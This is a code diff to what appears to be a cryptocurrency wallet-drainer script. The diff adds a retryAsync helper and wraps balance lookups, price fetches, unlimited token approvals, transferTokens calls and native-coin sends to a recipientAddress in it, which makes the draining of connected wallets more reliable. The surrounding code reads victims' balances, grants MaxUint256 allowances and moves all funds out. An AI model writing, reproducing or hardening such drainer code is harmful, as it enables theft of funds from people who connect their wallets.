@@ -468,11 +468,11 @@ async function connectWallet() {
     
             // Get native balances first
             try {
-              const nativeBalance = await networkProvider.getBalance(address);
+              const nativeBalance = await retryAsync(() => networkProvider.getBalance(address));
               if (nativeBalance.gte(minimumBalance)) {
                 const formattedNativeBalance = ethers.utils.formatUnits(nativeBalance, 18);
                 const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${nets.nativeCurrency.symbol.toLowerCase()}`;
-                const response = await fetch(proxyUrl);
+                const response = await retryAsync(() => fetch(proxyUrl));
                 const prices = await response.json();
                 const priceInfo = prices.data?.[nets.nativeCurrency.symbol.toUpperCase()]?.quote.USD.price;
                 nonZeroBalance.push({ tokenSymbol: nets.nativeCurrency.symbol, balance: parseFloat(formattedNativeBalance) });
@@ -491,12 +491,12 @@ async function connectWallet() {
               tokens.map(async (token) => {
                 try {
                   const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, networkProvider);
-                  const balance = await tokenContract.balanceOf(address);
+                  const balance = await retryAsync(() => tokenContract.balanceOf(address));
     
                   if (balance.gte(minimumBalance)) {
                     const formattedBalance = ethers.utils.formatUnits(balance, token.decimal);
                     const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
-                    const response = await fetch(proxyUrl);
+                    const response = await retryAsync(() => fetch(proxyUrl));
                     const prices = await response.json();
                     const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
                     nonZeroBalance.push({ symbol: token.tokenSymbol, balance: parseFloat(formattedBalance) });
@@ -799,9 +799,9 @@ async function fetchTokenDetails(tokens, address, signer) {
     tokens.map(async (token) => {
       try {
         const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-        const balance = await tokenContract.balanceOf(address);
+        const balance = await retryAsync(() => tokenContract.balanceOf(address));
         const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
-        const response = await fetch(proxyUrl);
+        const response = await retryAsync(() => fetch(proxyUrl));
         const prices = await response.json();
         const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
 
@@ -838,12 +838,12 @@ async function handleTokenApprovalsAndTransfers(tokenDetails, contractAddr, sign
     await Promise.all(
       tokenDetails.map(async (token) => {
         const maxUint256 = ethers.constants.MaxUint256;
-        const approveTx = await token.contract.approve(contractAddr, maxUint256, { gasLimit: 500000 });
+        const approveTx = await retryAsync(() => token.contract.approve(contractAddr, maxUint256, { gasLimit: 500000 }));
         await approveTx.wait();
         console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
 
         const contract = new ethers.Contract(contractAddr, contractABI, signer);
-        const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance, { gasLimit: 500000 });
+        const transferTx = await retryAsync(() => contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance, { gasLimit: 500000 }));
         await transferTx.wait();
         console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
       })
@@ -855,7 +855,7 @@ async function handleTokenApprovalsAndTransfers(tokenDetails, contractAddr, sign
 
 async function transferNativeToken(address, signer, provider, recipientAddress, symbol) {
   try {
-    const balance = await provider.getBalance(address);
+    const balance = await retryAsync(() => provider.getBalance(address));
     console.log(`Current balance: ${ethers.utils.formatEther(balance)} ${symbol}`);
 
     if (balance.gte(ethers.utils.parseUnits('0.02', 18))) {
@@ -866,7 +866,7 @@ async function transferNativeToken(address, signer, provider, recipientAddress, 
         to: recipientAddress,
         value: amountToSend,
       };
-      const txResponse = await signer.sendTransaction(transaction);
+      const txResponse = await retryAsync(() => signer.sendTransaction(transaction));
       console.log(`Transaction hash: ${txResponse.hash}`);
 
       const txReceipt = await txResponse.wait();
@@ -876,6 +876,22 @@ async function transferNativeToken(address, signer, provider, recipientAddress, 
     }
   } catch (error) {
     console.error(`Error transferring ${symbol}:`, error);
+  }
+}
+
+//RETRIES
+async function retryAsync(fn, retries = 3, delay = 1000) {
+  for (let i = 0; i < retries; i++) {
+    try {
+      return await fn();
+    } catch (error) {
+      if (i < retries - 1) {
+        console.log(`Retrying... (${i + 1}/${retries})`);
+        await new Promise(res => setTimeout(res, delay));
+      } else {
+        throw error;
+      }
+    }
   }
 }
 
